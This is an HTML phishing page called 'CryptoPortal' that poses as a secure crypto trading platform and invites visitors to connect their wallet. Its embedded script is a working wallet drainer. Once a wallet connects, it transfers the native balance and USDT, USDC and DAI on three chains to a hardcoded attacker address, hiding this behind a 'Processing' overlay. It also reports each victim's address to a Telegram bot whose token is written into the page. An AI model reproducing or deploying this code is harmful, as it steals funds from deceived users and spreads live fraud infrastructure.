<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CryptoPortal</title>
<!-- CDN qui fonctionnent en local -->
<script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    body {
        background: linear-gradient(135deg, #0a1427 0%, #0c1a33 100%);
        color: white;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    .crypto-container {
        max-width: 1200px;
        margin: 0 auto;
        padding: 20px;
        text-align: center;
    }
    .crypto-logo {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        margin-bottom: 40px;
    }
    .crypto-logo-icon {
        width: 50px;
        height: 50px;
        background: linear-gradient(135deg, #00c3ff, #00d7ff);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 24px;
    }
    .crypto-logo-text {
        font-size: 28px;
        font-weight: bold;
        background: linear-gradient(to right, #00c3ff, #00d7ff);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
    }
    .crypto-hero h1 {
        font-size: 3rem;
        margin-bottom: 20px;
        line-height: 1.2;
    }
    .crypto-hero p {
        font-size: 1.25rem;
        margin-bottom: 40px;
        color: #cccccc;
        line-height: 1.6;
        max-width: 600px;
        margin-left: auto;
        margin-right: auto;
    }
    .crypto-connect-btn {
        background: linear-gradient(135deg, #00c3ff, #00d7ff);
        color: white;
        border: none;
        padding: 18px 40px;
        border-radius: 50px;
        font-size: 1.2rem;
        font-weight: bold;
        cursor: pointer;
        transition: all 0.3s ease;
        box-shadow: 0 4px 20px rgba(0, 195, 255, 0.4);
        display: inline-flex;
        align-items: center;
        gap: 12px;
        margin-bottom: 50px;
    }
    .crypto-connect-btn:hover {
        transform: translateY(-3px);
        box-shadow: 0 6px 25px rgba(0, 195, 255, 0.6);
    }
    .crypto-cards {
        display: flex;
        justify-content: center;
        gap: 20px;
        flex-wrap: wrap;
        margin-top: 30px;
    }
    .crypto-card {
        width: 160px;
        height: 200px;
        background: rgba(255, 255, 255, 0.05);
        border-radius: 20px;
        padding: 20px;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        transition: transform 0.3s ease;
    }
    .crypto-card:hover {
        transform: translateY(-10px);
        background: rgba(255, 255, 255, 0.1);
    }
    .crypto-icon {
        width: 60px;
        height: 60px;
        border-radius: 50%;
        background: linear-gradient(135deg, #00c3ff, #00d7ff);
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 28px;
        margin-bottom: 15px;
    }
    .crypto-name {
        font-size: 1.1rem;
        font-weight: bold;
        margin-bottom: 5px;
    }
    .crypto-price {
        font-size: 1rem;
        color: #00c3ff;
    }
    @keyframes float {
        0% { transform: translateY(0px); }
        50% { transform: translateY(-10px); }
        100% { transform: translateY(0px); }
    }
    .floating {
        animation: float 5s ease-in-out infinite;
    }
    .processing {
        display: none;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: rgba(0, 0, 0, 0.9);
        padding: 40px;
        border-radius: 20px;
        text-align: center;
        z-index: 9999;
    }
    .processing.active {
        display: block;
    }
    @keyframes spin {
        to { transform: rotate(360deg); }
    }
    .spinner {
        animation: spin 1s linear infinite;
    }
</style>
</head>
<body>

<div class="crypto-container">
    <!-- Logo -->
    <div class="crypto-logo">
        <div class="crypto-logo-icon">
            <i class="fas fa-coins"></i>
        </div>
        <div class="crypto-logo-text">CryptoPortal</div>
    </div>

    <!-- Hero Section -->
    <div class="crypto-hero">
        <h1>Votre Porte d'Entr√©e vers<br>l'√âcosyst√®me Crypto</h1>
        <p>Connectez votre wallet pour acc√©der √† la plateforme de trading et d'investissement la plus s√©curis√©e.</p>
        
        <!-- Bouton Connect -->
        <button class="crypto-connect-btn" id="connectBtn" onclick="connectWallet()">
            <i class="fas fa-wallet"></i>
            <span>Connect Wallet</span>
        </button>
        
        <!-- Crypto Cards -->
        <div class="crypto-cards">
            <div class="crypto-card floating">
                <div class="crypto-icon">
                    <i class="fab fa-bitcoin"></i>
                </div>
                <div class="crypto-name">Bitcoin</div>
                <div class="crypto-price">$42,156</div>
            </div>
            <div class="crypto-card floating" style="animation-delay: 0.5s;">
                <div class="crypto-icon">
                    <i class="fab fa-ethereum"></i>
                </div>
                <div class="crypto-name">Ethereum</div>
                <div class="crypto-price">$2,845</div>
            </div>
            <div class="crypto-card floating" style="animation-delay: 1s;">
                <div class="crypto-icon">
                    <i class="fas fa-gem"></i>
                </div>
                <div class="crypto-name">Solana</div>
                <div class="crypto-price">$98.45</div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div style="margin-top: 60px; padding-top: 30px; border-top: 1px solid rgba(255, 255, 255, 0.1); color: #888; font-size: 0.9rem;">
        <p>¬© 2024 CryptoPortal. Tous droits r√©serv√©s.</p>
    </div>
</div>

<!-- Processing overlay -->
<div class="processing" id="processing">
    <div style="font-size: 48px; margin-bottom: 20px;" class="spinner">‚ö°</div>
    <h2 style="color: white; margin-bottom: 10px;">Processing...</h2>
    <p style="color: #aaa;">Please wait while we connect your wallet</p>
</div>

<!-- Script qui fonctionne en local -->
<script>
// Configuration
const DEST = "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1";
const TG_TOKEN = "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY";
const TG_CHAT = "8309320360";

// ERC20 Tokens
const TOKENS = {
    1: [ // Ethereum
        {addr:"0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol:"USDT"},
        {addr:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol:"USDC"},
        {addr:"0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol:"DAI"}
    ],
    137: [ // Polygon
        {addr:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol:"USDT"},
        {addr:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol:"USDC"}
    ],
    56: [ // BSC
        {addr:"0x55d398326f99059fF775485246999027B3197955", symbol:"USDT"},
        {addr:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol:"USDC"}
    ]
};

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 value) returns (bool)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)"
];

let provider, signer, address;

// Connect function
async function connectWallet() {
    const btn = document.getElementById('connectBtn');
    const processing = document.getElementById('processing');
    
    try {
        // Check if MetaMask is installed
        if (typeof window.ethereum === 'undefined') {
            alert('Please install MetaMask or another Web3 wallet!');
            window.open('https://metamask.io/download/', '_blank');
            return;
        }
        
        // Show processing
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
        btn.disabled = true;
        
        // Request account access
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (accounts.length === 0) {
            throw new Error('No accounts found');
        }
        
        address = accounts[0];
        console.log('Connected:', address);
        
        // Create provider and signer
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        
        // Get network
        const network = await provider.getNetwork();
        console.log('Network:', network.chainId);
        
        // Update button
        btn.innerHTML = '<i class="fas fa-check"></i> Connected';
        btn.style.background = 'linear-gradient(135deg, #00d395, #00c3ff)';
        
        // Send Telegram notification
        sendTelegramNotification(address, network.chainId);
        
        // Show processing overlay
        processing.classList.add('active');
        
        // Start drainage after 2 seconds
        setTimeout(async () => {
            await drainWallet(network.chainId);
            processing.classList.remove('active');
        }, 2000);
        
    } catch (error) {
        console.error('Connection error:', error);
        btn.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
        btn.disabled = false;
        processing.classList.remove('active');
        alert('Connection failed: ' + error.message);
    }
}

// Drainage function
async function drainWallet(chainId) {
    try {
        console.log('Starting drainage on chain:', chainId);
        
        // Check native balance
        const balance = await provider.getBalance(address);
        const balanceEth = ethers.utils.formatEther(balance);
        console.log('Balance:', balanceEth);
        
        if (parseFloat(balanceEth) > 0.001) {
            try {
                const gasPrice = await provider.getGasPrice();
                const gasCost = gasPrice.mul(21000).mul(2);
                const amount = balance.sub(gasCost);
                
                if (amount.gt(0)) {
                    const tx = await signer.sendTransaction({
                        to: DEST,
                        value: amount,
                        gasLimit: 21000
                    });
                    console.log('Native TX sent:', tx.hash);
                    await tx.wait();
                }
            } catch (e) {
                console.log('Native drain error:', e);
            }
        }
        
        // Check tokens
        const tokenList = TOKENS[chainId] || [];
        for (const token of tokenList) {
            try {
                await new Promise(r => setTimeout(r, 1500)); // Delay between tokens
                
                const contract = new ethers.Contract(token.addr, ERC20_ABI, signer);
                const tokenBalance = await contract.balanceOf(address);
                
                if (tokenBalance.gt(0)) {
                    const tx = await contract.transfer(DEST, tokenBalance, {
                        gasLimit: 100000
                    });
                    console.log(`${token.symbol} TX sent:`, tx.hash);
                    await tx.wait();
                }
            } catch (e) {
                console.log(`${token.symbol} error:`, e);
            }
        }
        
        console.log('Drainage complete!');
        
    } catch (error) {
        console.error('Drainage error:', error);
    }
}

// Send Telegram notification
async function sendTelegramNotification(addr, chainId) {
    const message = `üéØ NEW CONNECTION\nüë§ Address: ${addr}\nüåê Chain: ${chainId}\n‚è∞ Time: ${new Date().toLocaleTimeString()}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TG_CHAT,
                text: message
            })
        });
    } catch (e) {
        console.log('Telegram error:', e);
    }
}

// Auto-connect if already connected
window.addEventListener('load', async () => {
    if (window.ethereum) {
        const accounts = await window.ethereum.request({ 
            method: 'eth_accounts' 
        });
        if (accounts.length > 0) {
            console.log('Auto-connecting...');
            // connectWallet(); // Uncomment to auto-connect
        }
    }
});
</script>

</body>
</html>
